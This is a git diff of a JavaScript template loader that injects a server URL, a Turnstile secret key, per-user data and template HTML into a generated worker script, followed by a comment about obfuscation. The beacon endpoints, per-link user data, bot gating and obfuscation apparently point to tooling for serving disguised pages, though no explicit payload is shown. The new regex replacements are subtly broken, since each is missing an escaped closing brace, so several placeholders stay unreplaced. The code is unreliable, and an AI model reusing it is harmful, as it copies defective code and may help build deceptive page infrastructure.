@@ -79,21 +79,25 @@ function buildWorkerScript(link, user) {
 
   // Inject user data as a sanitized JSON string
   const safeUserJson = JSON.stringify(safeUser);
-  console.log('[TemplateLoader] Before replacement - VERIFY_ENDPOINT:', workerScript.includes("'{{VERIFY_ENDPOINT}}'"));
-  console.log('[TemplateLoader] Before replacement - BEACON_ENDPOINT:', workerScript.includes("'{{BEACON_ENDPOINT}}'"));
-  console.log('[TemplateLoader] Server URL:', serverUrl);
 
+  // Robust placeholder replacement using regex
+  var singleQuote = String.fromCharCode(39);
   workerScript = workerScript
-    .replace("'{{VERIFY_ENDPOINT}}'", `'${serverUrl}'`)
-    .replace("'{{BEACON_ENDPOINT}}'", `'${serverUrl}'`)
-    .replace("'{{LOG_ENDPOINT}}'", `'${serverUrl}'`)
-    .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
-    .replace("'{{TEMPLATE_HTML}}'", JSON.stringify(templateHTML))
-    .replace("'{{USER_DATA}}'", safeUserJson);
+    .replace(new RegExp(singleQuote + '\\{\\{VERIFY_ENDPOINT\\}\\' + singleQuote, 'g'), singleQuote + serverUrl + singleQuote)
+    .replace(new RegExp(singleQuote + '\\{\\{BEACON_ENDPOINT\\}\\' + singleQuote, 'g'), singleQuote + serverUrl + singleQuote)
+    .replace(new RegExp(singleQuote + '\\{\\{LOG_ENDPOINT\\}\\' + singleQuote, 'g'), singleQuote + serverUrl + singleQuote)
+    .replace(new RegExp(singleQuote + '\\{\\{TURNSTILE_SECRET\\}\\' + singleQuote, 'g'), singleQuote + (config.CF_TURNSTILE_SECRET_KEY || '') + singleQuote)
+    .replace(new RegExp(singleQuote + '\\{\\{TEMPLATE_HTML\\}\\' + singleQuote, 'g'), JSON.stringify(templateHTML))
+    .replace(new RegExp(singleQuote + '\\{\\{USER_DATA\\}\\' + singleQuote, 'g'), safeUserJson);
 
+  // Also replace without quotes (in case format changed)
+  workerScript = workerScript
+    .replace(/\{\{VERIFY_ENDPOINT\}\}/g, serverUrl)
+    .replace(/\{\{BEACON_ENDPOINT\}\}/g, serverUrl)
+    .replace(/\{\{LOG_ENDPOINT\}\}/g, serverUrl);
 
-  console.log('[TemplateLoader] After replacement - BEACON_ENDPOINT still exists:', workerScript.includes("'{{BEACON_ENDPOINT}}'"));
-  console.log('[TemplateLoader] After replacement - TEMPLATE_HTML still exists:', workerScript.includes('{{TEMPLATE_HTML}}'));
+  console.log('[TemplateLoader] Server URL:', serverUrl);
+  console.log('[TemplateLoader] After replacement - BEACON count:', (workerScript.match(/\{\{BEACON_ENDPOINT\}\}/g) || []).length);
 
 
   // Obfuscate if enabled - WORKER-SAFE approach
